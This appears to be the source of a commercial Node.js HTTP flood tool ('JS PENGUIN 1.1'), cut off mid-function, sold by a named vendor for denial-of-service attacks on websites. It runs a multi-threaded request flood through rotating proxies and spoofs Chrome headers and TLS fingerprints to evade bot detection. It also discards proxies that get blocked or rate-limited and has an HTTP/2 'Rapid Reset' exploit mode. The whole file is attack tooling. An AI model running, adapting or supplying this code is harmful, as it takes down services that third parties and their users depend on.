/*
    JS PENGUIN 1.1

    Node:: v22.9.0
    OS: Ubuntu 22.08
    Setup: npm install hpack https commander colors socks

    ATLAS corporation (t.me/atlasapi)
    Developer: Benshii (t.me/benshii)
    Date: 14 October, 2024

    ———————————————————————————————————————————"

    Released by ATLAS API corporation (atlasapi.co)

    Thank you for purchasing this script.

    1.1 CHANGELOG:
    - Added redirect handler
    - Added cookie parser
    - Fixed update headers
    - Added proxy conn stats
    - Removed UAM option
    
    1.2 CHANGELOG:
    - Added config loading

    COMING SOON
    // - Config options, load json config files with pre-defined options
    - End option, send rate amount of requests and close.
*/

const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const colors = require('colors');
const { Command } = require('commander');

process.setMaxListeners(0);

process.on('uncaughtException', function (e) {
    // console.log(e)
});
process.on('unhandledRejection', function (e) {
    // console.log(e)
});

const options = new Command();
options
    .option('-m, --method <method>', 'Request method <GET/POST/...>')
    .option('-u, --target <url>', 'Target URL <http/https>')
    .option('-s, --time <seconds>', 'Duration of attack <seconds>', 120) 
    .option('-t, --threads <number>', 'Number of threads <int>', 4)
    .option('-r, --rate <rate>', 'Requests per second <int>', 60)

    .option('-p, --proxy <proxy>', 'Proxy file <path>')
    .option('-d, --debug <debug>', 'Debug mode <true/false>', true)

    .option('-v, --http <version>', 'http version <1/2>', 2)
    .option('--full <full>', 'Full headers <true/false>', false)
    .option('--delay <delay>', 'Delay between requests <ms>', 10)
    .option('-D, --data <data>', 'Request data <string/RAND>')
    .option('--cache', 'Bypass cache <true/false>', false)
    .option('--end,', 'End <true/false>', false)
    .option('--reset', 'Rapidreset exploit <true/false>', false)
    .option('--close <close>', 'Close bad proxies <true/false>', false)

    .option('-q, --query <query>', 'Generate random query <true/false>', false)
    .option('--randrate <randrate>', 'Random request rate <true/false>', false)
    .option('--randpath <randpath>', 'Random URL path <true/false>', false)
    .option('--ratelimit <ratelimit>', 'Ratelimit mode <true/false>', false)

    .option('-I, --ip <ip:port>', 'IP address <ipv4>')
    .option('-U, --ua <agent>', 'User-agent header <string>')
    .option('-C, --cookie <cookie>', 'Cookie <string/RAND>')

    .option('-F, --fingerprint <fp>', 'TLS fingerprint <true/false>', false)
    .option('-R, --referer <referer>', 'Referer URL <url/RAND>')

    .option('--config <file>', 'Load configuration <file.json>')

    .parse(process.argv);

    if (options.opts().config && typeof options.opts().config === 'string') {
        try {
            const config_options = fs.readFileSync(options.config, 'utf8');
            const config = JSON.parse(config_options);
            Object.keys(config).forEach(key => {
                if (options[key] !== null && config[key] !== null && config[key] !== false && config[key] !== options.opts()[config[key]]) {
                    options[key] = config[key];
                }
            });
        } catch (error) {
            console.error(`Error loading config: ${error.message}`);
            process.exit(0)
        }
    }
    
const opts = options.opts();

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

if (!options.opts().method || !options.opts().target || !options.opts().proxy) {
    options.help();
    process.exit(1);
}

// const opts = options.opts();
const reqmethod = opts.method || "GET";
const target = opts.target;
const time = opts.time || 120;
const threads = opts.threads;
const ratelimit = opts.rate || 60;
const proxyfile = opts.proxy;
const debug = Boolean(opts.debug);

const http_opt = opts.http || undefined;
const full_headers = opts.full || false;
const delay_opt = opts.delay || 10;
const data_opt = opts.data || undefined;
const cache_opt = opts.cache;
const reset_opt = opts.reset;
const end_opt = opts.end;
const close_opt = opts.close;

const query_opt = opts.query || false;
const randrate = opts.randrate || false;
const randpath = opts.randpath || false;
const ratelimit_opt = opts.ratelimit;

const fingerprint_opt = opts.fingerprint || true;
const referer_opt = opts.referer || false;

const ip_opt = opts.ip || undefined;
const ua_opt = opts.ua || undefined;
var cookie_opt = opts.cookie || undefined;

// const uam_opt = opts.uam || false;

const statusesQ = []
let statuses = {}

const proxystatsQ = []
let proxystats = {}

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

const url = new URL(target);
const protocol = url.protocol.replace(":", "");
const port = url.port || (url.protocol === 'https:' ? 443 : 80);

const SettingHeaderTableSize = 0x1;
const SettingEnablePush = 0x2;
const SettingInitialWindowSize = 0x4;
const SettingMaxHeaderListSize = 0x6;

if (!proxyfile) {
    console.error("missing proxy file");
    process.exit(1);
}

const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (!['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'].includes(reqmethod)) {
    console.error('Invalid request method!');
    process.exit(1);
}

if (cookie_opt) {
    if (cookie_opt === 'RAND') {
        cookie_opt = cookie_opt ? `${cookie_opt}; ${random_string(6)}` : random_string(6);
    }
}



function random_string(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


function random_int(minimum, maximum) {
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
}

// process.on('SIGINT', process.exit(0));
// process.on('SIGTERM', process.exit(0));
// process.on('SIGTSTP', () => {
//     process.exit(0);
// });

class Http2 {
    constructor() {
        this.id = 1;
        // this.hpack.setTableSize(4096);
    }

    static builder() {
        return new Http2();
    }

    encode_frame(streamId, type, payload = "", flags = 0) {
        this.id = streamId;
        let frame = Buffer.alloc(9)
        frame.writeUInt32BE(payload.length << 8 | type, 0)
        frame.writeUInt8(flags, 4)
        frame.writeUInt32BE(streamId, 5)
        if (payload.length > 0)
            frame = Buffer.concat([frame, payload])
        return frame
    }

    decode_frame(data) {
        const lengthAndType = data.readUInt32BE(0)
        const length = lengthAndType >> 8
        const type = lengthAndType & 0xFF
        const flags = data.readUint8(4)
        const streamId = data.readUInt32BE(5)
        const offset = flags & 0x20 ? 5 : 0
    
        let payload = Buffer.alloc(0)
    
        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length)
    
            if (payload.length + offset != length) {
                return null
            }
        }
    
        return {
            streamId,
            length,
            type,
            flags,
            payload
        }
    }

    encode_settings(settings) {
        const data = Buffer.alloc(6 * settings.length)
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6)
            data.writeUInt32BE(settings[i][1], i * 6 + 2)
        }
        return data
    }
    
    encode_rst_stream(streamId, type, flags) {
        const frameHeader = Buffer.alloc(9);
        frameHeader.writeUInt32BE(4, 0);
        frameHeader.writeUInt8(type, 4);
        frameHeader.writeUInt8(flags, 5);
        frameHeader.writeUInt32BE(streamId, 5);
        const statusCode = Buffer.alloc(4).fill(0);
        return Buffer.concat([frameHeader, statusCode]);
    }
}

class Request {
    constructor(path) {
        this.path = path
        this.headers = [];
    }

    static builder() {
        return new Request();
    }

    set_path(path) {
        this.path = path
    }

    add_header(k, v) {
        const index = this.headers.findIndex(([key]) => key === k);
        if (index !== -1) {
            this.headers[index][1] = v;
        } else {
            this.headers.push([k, v]);
        }
        return this;
    }

    find_header(findStr) {
        const header = this.headers.find(([k, _]) => k === findStr);
        return header ? header[1] : null;
    }

    replace_header(k1, v1) {
        const index = this.headers.findIndex(([k, _]) => k === k1);
        if (index !== -1) {
            this.headers[index][1] = v1;
        }
        return this;
    }

    add_headers(headers) {
        for (const [key, value] of Object.entries(headers)) {
            if (value !== null && value !== undefined) {
                this.headers.push([key, value]);
            }
        }
        return this;
    }

    generate_headers(streamId) {
        const version = random_int(128, 130);
        var brandValue, versionList, fullVersion;
        switch (version) {
            case 126:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6690)}.${random_int(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 127:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6690)}.${random_int(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 128:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6690)}.${random_int(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 129:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6690)}.${random_int(10, 100)}`;
                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
                break;
            case 130:
                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6690)}.${random_int(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                break;
            default:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6690)}.${random_int(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
        }

        const platforms = [
            "Windows NT 10.0; Win64; x64",
            // "Macintosh; Intel Mac OS X 10_15_7",
            // "X11; Linux x86_64",
        ];

        const platform = platforms[Math.floor(Math.random() * platforms.length)];

        var secChUaPlatform, sec_ch_ua_arch, platformVersion;
        switch (platform) {
            case "Windows NT 10.0; Win64; x64":
                secChUaPlatform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platformVersion = "\"10.0.0\"";
                break;
            // case "Macintosh; Intel Mac OS X 10_15_7":
            //     secChUaPlatform = "\"macOS\"";
            //     sec_ch_ua_arch = "arm"
            //     platformVersion = "\"14.5.0\"";
            //     break;
            // case "X11; Linux x86_64":
            //     secChUaPlatform = "\"Linux\"";
            //     sec_ch_ua_arch = "x86"
            //     platformVersion = "\"5.15.0\"";
            //     break;
            // default:
            //     secChUaPlatform = "\"Windows\"";
            //     sec_ch_ua_arch = "x86";
            //     platformVersion = "\"10.0.0\"";
            //     break;
        }

        var user_agent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;

        if (ua_opt) {
            user_agent = ua_opt;
        }

        var referer;
        if (referer_opt) {
            const extensions = ['com', 'net', 'org', 'io', 'co', 'gov'];
            const extension = extensions[Math.random(Math.floor() * extensions.length)];
            try {
                if (referer_opt === "RAND") {
                    referer = `https://${random_string(random_int(6, 9))}.${extension}/`;
                } else {
                    const referer_url = new URL(referer_opt);
                    referer = referer_url.href;
                }
            } catch (err) {
                referer = url.href;
            }
        }

        // if (uam_opt) {
        //     if (cookie_opt) {
        //         cookie_opt = `${cookie_opt}; cf_clearance=${random_string(4)}.${random_string(20)}.${random_string(40)}-0.0.1${random_string(20)};_ga=${random_string(20)};_gid=${random_string(15)}`;
        //     }
        // }

        const headers = Object.entries({
            ":method": reqmethod,
            ":authority": url.hostname,
            ":scheme": "https",
            ":path": randpath ? random_string(10) : url.pathname 
        }).concat(Object.entries({
            ...(streamId > 1) && { "cache-control": "max-age=0" },
            ...(reqmethod === "POST" && { "content-length": "0" }),
            ...(reqmethod === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
            "sec-ch-ua": brandValue,
            ...(full_headers && { "sec-ch-ua-arch": sec_ch_ua_arch }),
            ...(full_headers && { "sec-ch-ua-bitness": "\"64\"" }),
            ...(full_headers && { "sec-ch-ua-full-version": fullVersion }),
            ...(full_headers && { "sec-ch-ua-full-version-list": versionList }),
            "sec-ch-ua-mobile": "?0",
            ...(full_headers && { "sec-ch-ua-model": "\"\"" }),
            "sec-ch-ua-platform": secChUaPlatform,
            ...(full_headers && { "sec-ch-ua-platform-version": platformVersion }),
            "upgrade-insecure-requests": "1",
            "user-agent": user_agent,
            // ...(streamId === 1) && { "sec-purpose": "prefetch;prerender"},
            // ...(streamId === 1) && { "purpose": "prefetch"},
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": 'en-US,en;q=0.9',
            "priority": 'u=0, i',
            ...(cookie_opt) && { "cookie": cookie_opt },
            ...(referer) && { "referer": referer},
            // ...(uam_opt) && { "x-forwarded-proto": "https"},
            // ...(uam_opt) && { "x-forwarded-for": `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`}
        })).filter(a => a[1] != null);

        this.add_headers(Object.fromEntries(headers));
        this.order_headers() // new
        return this;
    }

    update_headers(streamId) {
        if (streamId > 1 && streamId <= 3) {
            if (cache_opt) {
                this.add_header("cache-control", "no-cache");
            } else {
                this.add_header("cache-control", "max-age=0");
            }
            // this.remove_header("sec-purpose");
            // this.remove_header("purpose");
        }
        if (this.path !== undefined && this.path !== url.pathname) {
            // console.log("paths aren't the same")
            // console.log(`${this.path} !== ${url.pathname}`);
            this.replace_header(":path", this.path);
            // this.replace_header(":authority", )
        }
        this.order_headers();
        return this;
    }

    // remove_header(header) {
    //     const index = this.headers.indexOf(header)
    //     if (index > -1) {
    //         this.headers.splice(index, 1);
    //     }
    //     return this;
    // }
    remove_header(header) {
        const index = this.headers.findIndex(([header_index, _]) => header_index === header);
        if (index > -1) {
            this.headers.splice(index, 1);
        }
        return this;
    }

    order_headers() {
        const order = [
            ":method",
            ":authority",
            ":scheme",
            ":path",
            "cache-control",
            "content-length",
            "content-type",
            "sec-ch-ua",
            "sec-ch-ua-arch",
            "sec-ch-ua-bitness",
            "sec-ch-ua-full-version",
            "sec-ch-ua-full-version-list",
            "sec-ch-ua-mobile",
            "sec-ch-ua-model",
            "sec-ch-ua-platform",
            "sec-ch-ua-platform-version",
            "upgrade-insecure-requests",
            "user-agent",
            "sec-purpose",
            "purpose",
            "accept",
            "sec-fetch-site",
            "sec-fetch-mode",
            "sec-fetch-user",
            "sec-fetch-dest",
            "accept-encoding",
            "accept-language",
            "priority",
            "cookie",
            "referer",
            "x-forwarded-proto",
            "x-forwarded-for",
        ];

        const order_map = new Map(order.map((header, index) => [header, index]));

        this.headers.sort(([header], [index]) => {
            const index1 = order_map.get(header);
            const index2 = order_map.get(index);
            return (index1 !== undefined ? index1 : Infinity) - (index2 !== undefined ? index2 : Infinity);
        });
    }

    parse_headers() {
        return this;
    }

    build_str() {
        let requestStr = `GET ${this.path} HTTP/1.1\r\n`;

        for (const [k, v] of this.headers) {
            if (!k.startsWith(":")) {
                requestStr += `${k}: ${v}\r\n`;
            }
        }

        requestStr += 'Connection: Keep-Alive\r\n\r\n';
        return requestStr;
    }
}

const ja3Params = {
    "0": "771,772",
    "1": "4865,4866,4867,4868,4869,49195,49196,49197,49198,49199",
    "2": "0,10,11,35,13,43,23,5,45",
    "3": "29,23,24",
    "4": "0"
};

function generate_fingerprint(params) {
    const ja3_string = Object.keys(params)
        .map(key => params[key])
        .join(',');
    
    const hash = crypto.createHash('md5');
    hash.update(ja3_string);
    
    return hash.digest('hex');
}

const ja3_fingerprint = generate_fingerprint(ja3Params);

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

async function go() {
    if (proxy.length <= 0) {
        fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
    }
    let proxyHost, proxyPort, username, password;
    if (ip_opt) {
        [proxyHost, proxyPort, username, password] = ip_opt.split(':');
        /*
            Find keyword in proxy split, could be ':', or could be '@'
        */
    } else {
        [proxyHost, proxyPort, username, password] = proxy[~~(Math.random() * proxy.length)].split(':');
    }

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        await go();
        return;
    }
    // console.log(`proxyHost: ${proxyHost}, proxyPort: ${proxyPort}, username: ${username}, password: ${password}`);
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.on('data', async (data) => {
            // console.log("Data received:", data.toString());
            data = data.toString();
            if (data.includes('200') || data.includes('Connection established')) {
                // console.log("connected");
                if (protocol === "https") {
                    tlsSocket = tls.connect({
                        socket: netSocket,
                        ALPNProtocols: http_opt === 1 ? ['http/1.1'] : http_opt === 2 ? ['h2'] : ['h2', 'http/1.1'],
                        servername: url.hostname,
                        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
                        // sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
                        ecdhCurve: 'X25519:P-256:P-384',
                        // secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                        //     crypto.constants.SSL_OP_NO_TICKET |
                        //     crypto.constants.SSL_OP_NO_SSLv2 |
                        //     crypto.constants.SSL_OP_NO_SSLv3 |
                        //     crypto.constants.SSL_OP_NO_COMPRESSION |
                        //     crypto.constants.SSL_OP_NO_RENEGOTIATION |
                        //     crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                        //     crypto.constants.SSL_OP_TLSEXT_PADDING |
                        //     crypto.constants.SSL_OP_ALL |
                        //     crypto.constants.SSLcom,
                        secure: true,
                        // session: crypto.randomBytes(16),
                        // requestOCSP: true,
                        minVersion: 'TLSv1.2',
                        maxVersion: 'TLSv1.3',
                        rejectUnauthorized: false,
                        ...(fingerprint_opt === true ? { fingerprint: ja3_fingerprint } : {}),
                    }, async () => {
                        // if (!statuses["CONNS"]) statuses["CONNS"] = 0;
                        // statuses["CONNS"]++;

                        var pathname;
                        if (url.pathname.includes('%RAND%')) {
                            pathname = '/' + random_string(6);
                        }
        
                        if (query_opt) {
                            pathname = pathname + '?' + random_string(6)
                        }
        
                        var request = new Request(pathname);
                        request.set_path(pathname);
        
                        tlsSocket.on('close', () => {
                            if (!statuses["CLOSE"]) statuses["CLOSE"] = 0;
                            statuses["CLOSE"]++;
                            tlsSocket.end(() => tlsSocket.destroy());
                            // return;
                        });
        
                        if (tlsSocket.alpnProtocol !== "h2" || !tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === "http/1.1") {
                            request.generate_headers(0);
                            var headers = request.build_str();
        
                            tlsSocket.on('data', (response) => {
                                const responseStr = response.toString('utf8');
                                const statusMatch = responseStr.match(/HTTP\/1\.1 (\d{3})/);
                                if (statusMatch) {
                                    const statusCode = parseInt(statusMatch[1]);
        
                                    if (!statuses[statusCode]) {
                                        statuses[statusCode] = 0;
                                    }
                                    statuses[statusCode]++;
                                }
                            });
        
                            function http1() {
                                tlsSocket.write(headers, (err) => {
                                    if (!err) {
                                        setTimeout(() => {
                                            http1();
                                        }, ratelimit / 1000)
                                    } else {
                                        if (!statuses["CLOSE"]) statuses["CLOSE"] = 0;
                                        statuses["CLOSE"]++;
                                        tlsSocket.end(() => tlsSocket.destroy());
                                    }
                                })
                            }
        
                            http1();
                        }
            
                        var http2 = new Http2();
                        let streamId = 1;
                        let data = Buffer.alloc(0);
                        let hpack = new HPACK();
                        // hpack.setTableSize(4096);

                        let redirect_count = 0;
        
                        request.generate_headers(streamId);
        
                        const updateWindow = Buffer.alloc(4);
                        updateWindow.writeUInt32BE(15663105, 0);
            
                        const frames = [];
                        frames.push(Buffer.from(PREFACE, 'binary'))
            
                        const settings_frame = http2.encode_frame(0, 0x4, http2.encode_settings([
                            [SettingHeaderTableSize, 65536],
                            [SettingEnablePush, 0],
                            [SettingInitialWindowSize, 6291456],
                            [SettingMaxHeaderListSize, 262144],
                        ]));
            
                        frames.push(settings_frame);
                        const update_window_frame = http2.encode_frame(0, 0x8, updateWindow);
                        frames.push(update_window_frame);
            
                        tlsSocket.on('data', async (response) => {
                            data = Buffer.concat([data, response]);
                                while (data.length >= 9) {
                                    const frame = http2.decode_frame(data);
                                    if (frame != null) {
                                        data = data.subarray(frame.length + 9);
                                        // console.log(`[${frame.streamId}], Type: [${frame.type}], Flags: [${frame.flags}]`);
                                        if (frame.type === 1) {
                                            try {
                                                const decodedHeaders = hpack.decode(frame.payload);
                                                const setCookieHeaders = decodedHeaders.filter(header => header[0].toLowerCase() === 'set-cookie');
                                                const statusObject = decodedHeaders.find(header => header[0] === ':status');
                                                const status = statusObject ? statusObject[1] : null;
                                                const cfMitigatedHeader = decodedHeaders.find(x => x[0] === 'cf-mitigated');
                                                const retryAfterHeader = decodedHeaders.find(x => x[0] === 'retry-after');
                                                const locationHeader = decodedHeaders.find(x => x[0] === 'location');

                                                if (setCookieHeaders.length >= 1) {
                                                    let formattedCookies = setCookieHeaders
                                                        .map(cookie => cookie[1].split(';')[0].trim())
                                                        .join(';');
                                                    const current_cookies = request.find_header("cookie");
                                                    if (current_cookies) {
                                                        // console.log(`current_cookies -> ${current_cookies}`);
                                                        if (current_cookies.includes('=') && formattedCookies.includes('=')) {
                                                            if (current_cookies.split('=')[0] === formattedCookies.split('=')[0]) {
                                                                // console.log('cookie prefix is the same');
                                                                request.replace_header('cookie', formattedCookies);
                                                            } else {
                                                                request.replace_header('cookie', `${current_cookies}; ${formattedCookies}`)
                                                            }
                                                        }
                                                    } else {
                                                        request.add_header('cookie', formattedCookies);
                                                    }
                                                    request.update_headers(streamId);
                                                }

                                                if (locationHeader && locationHeader[1]) {
                                                    // console.log('location ->', locationHeader);
                                                    const redirect_url = new URL(locationHeader[1], url.href);
                                                    const redirect = {
                                                        host: redirect_url.host,
                                                        path: redirect_url.pathname,
                                                        href: redirect_url.href,
                                                    }
                                                    // console.log(redirect);
                                                    if (redirect.host !== undefined && redirect.host !== url.hostname) {
                                                        request.replace_header(":authority", redirect.host);
                                                    }
                                                    if (redirect.path !== undefined) {
                                                        // console.log('redirect path ->', redirect.path);
                                                        request.set_path(redirect.path);
                                                        request.replace_header(":path", redirect.path);
                                                    }
                                                    redirect_count += 1;
                                                    request.update_headers(streamId);
                                                    // console.log(`(LISTENER) redirect_count = ${redirect_count}`);
                                                    await send();
                                                    // console.log(request.headers);
                                                }
            
                                                if (!statuses[status]) {
                                                    statuses[status] = 0;
                                                }
                
                                                statuses[status]++;

                                                if (close_opt && (["403", '429'].includes(status))) {
                                                    let index;
                                                    if (!username && !password) { index = proxy.indexOf(`${proxyHost}:${proxyHost}`)}
                                                    else { index = proxy.indexOf(`${proxyHost}:${proxyPort}:${username}:${password}`);}
                                                    if (index > -1) {
                                                        proxy.splice(index, 1);
                                                        tlsSocket.end(() => tlsSocket.destroy());
                                                        netSocket.removeAllListeners();
                                                        netSocket.end(() => netSocket.destroy());
                                                    }
                                                    tlsSocket.write(Buffer.concat([http2.encode_frame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                                                    return;
                                                }

                                                if (ratelimit_opt && (retryAfterHeader && retryAfterHeader[1]) && status === "429") {
                                                    // console.log("general ratelimit for:", retryAfterHeader[1]);
                                                    // console.log(`Status: ${status}, Ratelimited: ${proxyHost}:${proxyPort}, duration: ${retryAfterHeader}`);
                                                    tlsSocket.end(() => tlsSocket.destroy());
                                                    return;
                                                }

                                                if (cfMitigatedHeader && cfMitigatedHeader[1] === 'challenge') {
                                                    tlsSocket.end(() => tlsSocket.destroy());
                                                    return;
                                                }
                                            } catch (err) { }

                                        } else if (frame.type === 3) {
                                            if (!statuses["RST"]) statuses["RST"] = 0;
                                            statuses["RST"]++;
                                            tlsSocket.end(() => tlsSocket.destroy());
                                        } else if (frame.type == 4 && frame.flags == 0) {
                                            tlsSocket.write(http2.encode_frame(0, 0x4, "", 0x1));
                                        } else if (frame.type === 5) {
                                            // push promise
                                            continue;
                                        } else if (frame.type === 6) {
                                            if (!(frame.flags & 0x1)) {
                                                tlsSocket.write(encodeFrame(0, 0x6, frame.payload, 0x1));
                                            }
                                        } else if (frame.type === 7) {
                                            if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                                            statuses["GOAWAY"]++;
                                            tlsSocket.end(() => tlsSocket.destroy());
                                        }
                                    } else {
                                        break;
                                    }
                                }
                        });
            
                        tlsSocket.write(Buffer.concat(frames));
        
                        let rate = ratelimit;
                        if (randrate) { rate = random_int(1, 90) }
                        async function send() {
                            for (var x = 0; x < rate; x++) {
                                if (tlsSocket.destroyed || netSocket.destroyed) {
                                    return;
                                }

                                request.update_headers(streamId);
                                // console.log(request.headers);
                                // console.log(`ID: [${streamId}], Path: ${request.find_header(':path')}, Authority: ${request.find_header(':authority')}, Redirects: ${redirect_count}, Cookies: ${request.find_header('cookie')}`);

                                // console.log(`redirect_count = ${redirect_count}`);
                                const packedHeaders = Buffer.concat([
                                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                    hpack.encode(request.headers)
                                ]);
        
                                tlsSocket.write(Buffer.concat([http2.encode_frame(streamId, 0x1, packedHeaders, 0x1 | 0x4 | 0x20)]));
        
                                if (data_opt !== undefined) {
                                    const data_buffer = Buffer.from(data_opt, 'utf-8');
                                    tlsSocket.write(Buffer.concat([
                                        http2.encode_frame(streamId, 0x0, data_buffer, 0x0)
                                    ]));
                                } else if (data_opt === "RAND") {
                                    const data_buffer = Buffer.from(random_string(random_int(10, 100)), 'utf-8');
                                    tlsSocket.write(Buffer.concat([
                                        http2.encode_frame(streamId, 0x0, data_buffer, 0x0)
                                    ]));
                                }
        
                                if (reset_opt && (streamId / 2 > ratelimit && streamId >= 5)) {
                                    tlsSocket.write(Buffer.concat([http2.encode_frame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                                }
            
                                streamId += 2;
        
                                if (delay_opt) { await delay(delay_opt) }
                            }
                        }
                        if (end_opt) {
                            await send();
                            tlsSocket.write(Buffer.concat([http2.encode_frame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                            tlsSocket.end(() => tlsSocket.destroy());
                            return;
                        } else {
                            setTimeout(() => {
                                send();
                            }, 1000);
                        }
                    }).on('error', (err) => {
                        // console.log(err);
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                } else if (protocol === "http") {
                    // http handler
                    netSocket.setKeepAlive(true, 5000);
                    netSocket.setTimeout(5000);
    
                    var pathname;
                    if (url.pathname.includes('%RAND%')) { pathname = '/' + random_string(6) }
                    if (query_opt) { pathname = pathname + '?' + random_string(6) }
                    var request = new Request(pathname);
                    request.set_path(pathname);
    
                    request.generate_headers(0);
                    const httpPayload = request.build_str();
    
                    netSocket.on('data', (response) => {
                        const responseStr = response.toString('utf8');
                        const statusMatch = responseStr.match(/HTTP\/1\.1 (\d{3})/);
                        if (statusMatch) {
                            const statusCode = parseInt(statusMatch[1]);
    
                            if (!statuses[statusCode]) {
                                statuses[statusCode] = 0;
                            }
                            statuses[statusCode]++;
                        }
                    });
    
                    function http() {
                        for (var x = 0; x < rate; x++) {
                            netSocket.write(httpPayload, (err) => {
                                if (err) {
                                    // return:
                                    netSocket.destroy();
                                    return;
                                }
                            })
                        }
                    }

                    setTimeout(() => {
                        http();
                    }, 1000)
                } else {
                    console.log("Invalid protocol:", protocol);
                    process.exit(0);
                }
            } else if (data.includes('403') && data.includes('forbidden')) {
                let index;
                if (!username && !password) { index = proxy.indexOf(`${proxyHost}:${proxyHost}`)}
                else { index = proxy.indexOf(`${proxyHost}:${proxyPort}:${username}:${password}`);}
                if (index > -1) {
                    proxy.splice(index, 1);
                    netSocket.removeAllListeners();
                    netSocket.end(() => netSocket.destroy());
                }
            }
        }).on('end', () => {
            if (!statuses["CLOSE"]) statuses["CLOSE"] = 0;
            statuses["CLOSE"]++;
            // if (!statuses["CONNS"]) statuses["CONNS"] = 0;
            // statuses["CONNS"]--;
            // tlsSocket.end(() => tlsSocket.destroy());
            return;
        })
        if (!username) {
            netSocket.write(`CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        } else {
            const authString = Buffer.from(`${username}:${password}`).toString('base64');
            netSocket.write(`CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nProxy-Authorization: Basic ${authString}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        }
    }).on('error', (err) => {
        // console.log(err)
    }).on('close', () => {
        if (tlsSocket) {
            // if (!statuses["CONNS"]) statuses["CONNS"] = 0;
            // statuses["CONNS"]--;
            tlsSocket.end(() => tlsSocket.destroy());
            go();
        }
    }).on('timeout', () => {
        if (!statuses["TIMEOUT"]) statuses["TIMEOUT"] = 0;
        statuses["TIMEOUT"]++;
        // if (!statuses["CONNS"]) statuses["CONNS"] = 0;
